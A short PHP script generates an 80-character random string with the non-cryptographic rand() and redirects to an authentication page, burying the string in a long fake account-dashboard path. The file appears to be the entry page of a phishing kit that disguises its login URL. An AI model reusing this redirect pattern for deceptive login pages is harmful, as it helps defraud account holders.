<?php

function genRandString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$_SESSION['randString']     = genRandString(80);

header("Location: web/authen.php?web/auth/arub12#/dashboard/overviewAccounts/overview/index={$_SESSION['randString']}");
